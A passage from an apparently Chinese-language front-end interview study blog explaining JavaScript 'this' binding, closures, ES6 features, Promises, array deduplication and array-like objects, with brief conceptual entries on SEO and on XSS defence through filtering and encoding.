<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> <span class="token function-variable function">getThis</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">let</span> obj<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">"Jack"</span><span class="token punctuation">,</span>
    <span class="token function-variable function">getThis</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window</span>
<span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//window</span>
<span class="token comment">//此处的getThis()方法是obj这个对象调用的，所以this指向obj</span>
obj<span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象；</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token function-variable function">getThis</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
obj<span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//window</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
     <span class="token function-variable function">getThis</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token comment">//提前保存this指向</span>
         <span class="token keyword">let</span> _this<span class="token operator">=</span><span class="token keyword">this</span>
         <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_this<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 obj<span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>箭头函数中的this<ol>
<li>箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的；</li>
<li>箭头函数中的this指向父级作用域的执行上下文；（技巧：<strong>因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this</strong>）</li>
<li>箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。</li>
</ol>
</li>
</ol>
<p>例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//此处的this即是箭头函数中的this</span>
    <span class="token function-variable function">getThis</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span>  <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
obj<span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//obj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。</p>
<p><a target="_blank" rel="noopener" href="https://www.nowcoder.com/study/live/691/2/9#">复制代码</a></p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"> <span class="token comment">//代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。</span>
<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
     <span class="token function-variable function">getThis</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">return</span>  <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>
             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 obj<span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//window</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h3 id="16、闭包"><a href="#16、闭包" class="headerlink" title="16、闭包"></a>16、闭包</h3><h4 id="形式："><a href="#形式：" class="headerlink" title="形式："></a>形式：</h4><p>方法里面返回一个方法</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> a<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="意义："><a href="#意义：" class="headerlink" title="意义："></a>意义：</h4><ol>
<li>延长变量生命周期</li>
<li>创建私有环境</li>
</ol>
<p>Vue中data也是一个闭包</p>
<pre class="line-numbers language-none"><code class="language-none">data（）&#123;
	return&#123;
	
	&#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>会常驻内存，所以慎用</p>
<h3 id="17、ES6"><a href="#17、ES6" class="headerlink" title="17、ES6"></a>17、ES6</h3><h4 id="var-let-const"><a href="#var-let-const" class="headerlink" title="var let const"></a>var let const</h4><h5 id="var"><a href="#var" class="headerlink" title="var:"></a>var:</h5><ol>
<li><p>变量提升</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">//undefined</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


</li>
<li><p>变量覆盖</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span><span class="token number">12</span>
<span class="token keyword">var</span> a <span class="token operator">=</span><span class="token number">23</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">//23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>没有块级作用域</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">//3</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h5 id="const"><a href="#const" class="headerlink" title="const:"></a>const:</h5><ol>
<li><p>const声明之后必须赋值</p>
</li>
<li><p>const定义数组，可以对数组修改</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"sad"</span><span class="token punctuation">,</span> <span class="token string">"666"</span><span class="token punctuation">,</span> <span class="token string">"qewqe"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'5465'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h4 id="解构"><a href="#解构" class="headerlink" title="解构"></a>解构</h4><pre class="line-numbers language-none"><code class="language-none">let a&#x3D;1;
let b &#x3D;2;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>不使用第三个变量互换值</p>
<pre class="line-numbers language-none"><code class="language-none">[a,b]&#x3D;[b,a]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>构造函数同步执行   &#x2F;&#x2F;1,2</li>
<li>异步函数异步执行 &#x2F;&#x2F;4,3</li>
</ul>
<h3 id="18、xss"><a href="#18、xss" class="headerlink" title="18、xss"></a>18、xss</h3><p>xss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；<br>首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “&lt;&gt; , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；<br>攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ；</p>
<h3 id="19、SEO"><a href="#19、SEO" class="headerlink" title="19、SEO"></a>19、SEO</h3><p>SEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。</p>
<h3 id="20、数组去重"><a href="#20、数组去重" class="headerlink" title="20、数组去重"></a>20、数组去重</h3><p>ES6：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span>  arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">unique</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">unique</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">unique</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">unique</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ES5：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">unique</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> Newarr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>Newarr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      Newarr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> Newarr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">unique</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="21、数组和伪数组的区别"><a href="#21、数组和伪数组的区别" class="headerlink" title="21、数组和伪数组的区别"></a>21、数组和伪数组的区别</h3><ol>
<li>定义</li>
</ol>
<ul>
<li>数组是一个特殊对象,与常规对象的区别：<ul>
<li>当由新元素添加到列表中时，自动更新length属性</li>
<li>设置length属性，可以截断数组</li>
<li>从Array.protoype中继承了方法</li>
<li>属性为’Array’</li>
</ul>
</li>
<li>类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。</li>
</ul>
<ol>
<li>区别<br>本质：类数组是简单对象，它的原型关系与数组不同。</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 原型关系和原始值转换</span>
<span class="token keyword">let</span> arrayLike <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrayLike <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrayLike<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrayLike<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [object Object]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrayLike<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;length: 10&#125;</span>

<span class="token keyword">let</span> array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>array <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>array<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>array<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ''</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>array<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// []</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>类数组转换为数组</li>
</ol>
<ul>
<li>转换方法<ul>
<li>使用 <code>Array.from()</code></li>
<li>使用 <code>Array.prototype.slice.call()</code></li>
<li>使用 <code>Array.prototype.forEach()</code> 进行属性遍历并组成新的数组</li>
</ul>
</li>
<li>转换须知<ul>
<li>转换后的数组长度由 <code>length</code> 属性决定。索引不连续时转换结果是连续的，会自动补位。</li>
<li>代码示例</li>
</ul>
</li>
</ul>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> al1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
    <span class="token number">0</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token number">1</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token number">3</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>
    <span class="token number">4</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
    <span class="token number">5</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>al1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [0, 1, undefined, 3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>②仅考虑 0或正整数 的索引</li>
</ul>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 代码示例</span>
<span class="token keyword">let</span> al2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
    <span class="token string-property property">'-1'</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token string-property property">'0'</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span>
    <span class="token number">1</span><span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>al2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [0, 1, undefined, undefined]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>③使用slice转换产生稀疏数组</li>
</ul>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 代码示例</span>
<span class="token keyword">let</span> al2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
    <span class="token string-property property">'-1'</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token string-property property">'0'</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span>
    <span class="token number">1</span><span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>al2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[0, 1, empty × 2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>使用数组方法操作类数组注意地方</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.nowcoder.com/study/live/691/2/4#">复制代码</a></p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> arrayLike2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token number">2</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>
  <span class="token number">3</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
  <span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
  <span class="token literal-property property">push</span><span class="token operator">:</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>push
<span class="token punctuation">&#125;</span>

<span class="token comment">// push 操作的是索引值为 length 的位置</span>
